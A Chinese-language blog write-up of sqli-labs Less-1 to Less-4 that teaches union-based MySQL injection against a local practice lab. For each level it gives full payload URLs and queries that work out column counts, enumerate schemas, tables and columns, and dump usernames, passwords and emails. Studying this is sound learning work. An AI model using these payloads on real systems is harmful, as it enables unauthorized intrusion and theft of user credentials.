---
layout: post
title:  "0x01 联合查询注入"
subtitle: "sqli-labs"
date:   2020-03-24 16：43
categories: [pentest]
---
mysql注入语句

联合查询

> 1. 单引号判断
>
> 2. 查询列数
>
>    ```sql
>      ?id=1' oder by num %23
>    ```
>
> 3. 查询返回列
>
>    ```mysql
>      ?id=-1' union select 1,2,3 %23
>    ```
>
> 4. 查询数据库
>
>    ```mysql
>      ?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata%23
>    ```
>
> 5. 查询表名
>
>    ```mysql
>      ?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'%23
>    ```
>
> 6. 查询列名
>
>    ```mysql
>      ?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'%23
>    ```
>
> 7. 查询数据
>
>    ```mysql
>      ?id=-1' union select 1,username,password from users where id =2%23
>    ```

## less1

url

```u
http://127.0.0.1:9999/Less-1/?id=1'
```

报错信息

```mysql
 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1 
```

对此猜测数据库查询语句为**错误**

```mysql
select username,password from users where id = $id limit 0,1 
```

实际的源码为

```mysql
SELECT * FROM users WHERE id='$id' LIMIT 0,1
```

这里应该是字符型注入，报错信息中有效信息应该为

``` html
'1'' LIMIT 0,1
可以发现是'1'多了一个'导致报错的
```

那么我们输入payload后在数据库中执行的语句为

```mysql
SELECT * FROM users WHERE id='-1' union select 1,username,password from users where id =2#' LIMIT 0,1
```

## less2

url

```
http://127.0.0.1:9999/Less-2/?id=1%27
```

报错信息

```mysql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1
```

其中有效的报错信息就是`' LIMIT 0,1`,那么可以判断这是数字型注入，判断数据库查询语句为

```msyql
select * from users where id = $id limit 0,1
```

输入payload后在数据库中执行的语句为

```mysql
select * from users where id = -1 union select 1,id,email_id from emails where id = 1 #limit 0,1
```

对其进行手注

```mysql
http://127.0.0.1:9999/Less-2/?id=1 order by 3 %23
http://127.0.0.1:9999/Less-2/?id=-1 union select 1,2,3 %23
http://127.0.0.1:9999/Less-2/?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata %23
http://127.0.0.1:9999/Less-2/?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema ="security"
http://127.0.0.1:9999/Less-2/?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'%23
http://127.0.0.1:9999/Less-2/?id=-1 union select 1,id,email_id from emails%23
PS:查询其他表时要保持查询列数一致
```

## less3

url

```
http://127.0.0.1:9999/Less-3/?id=1%27
```

报错信息

```msyql
 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1 
```

有用信息为`'1'') LIMIT 0,1`,多了个括号，猜测源码为

```mysql
select * from users where id = ('&id') LIMIT 0,1
```

输入payload后在数据库中执行的语句为

```mysql
select * from users where id = ('-1') union select 1,id,email_id from emails where id =1#') LIMIT 0,1
```

对其进行手注

```mysql
http://127.0.0.1:9999/Less-3/?id=-1%27) order by 3%23
http://127.0.0.1:9999/Less-3/?id=-1%27) union select 1,2,3%23
http://127.0.0.1:9999/Less-3/?id=-1%27) union select 1,2,group_concat(schema_name) from information_schema.schemata%23
http://127.0.0.1:9999/Less-3/?id=-1%27) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'%23
http://127.0.0.1:9999/Less-3/?id=-1%27) union select 1,2,group_concat(column_name) from information_schema.columns where table_name='emails'%23
http://127.0.0.1:9999/Less-3/?id=-1%27) union select 1,id,email_id from emails where id =1 %23
```

## less4

url

```msyql
http://127.0.0.1:9999/Less-4/?id=1'
```

单引号未报错，尝试双引号报错

```mysql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1"") LIMIT 0,1' at line 1
```

有用信息为`"1"") LIMIT 0,1`，猜测数据库中查询语句为

```mysql
select * from users where id = ("$id") LIMIT 0,1
```

输入payload后数据库执行语句为

```mysql
select * from users where id =("-1") union select 1,id,email_id from emails where id =1 #") LIMIT 0,1
```

对其进行手注

```mysql
http://127.0.0.1:9999/Less-4/?id=-1") union select 1,2,group_concat(schema_name) from information_schema.schemata%23
http://127.0.0.1:9999/Less-4/?id=-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'%23
http://127.0.0.1:9999/Less-4/?id=-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_name='emails'%23
http://127.0.0.1:9999/Less-4/?id=-1") union select 1,id,email_id from emails where id =1%23
```
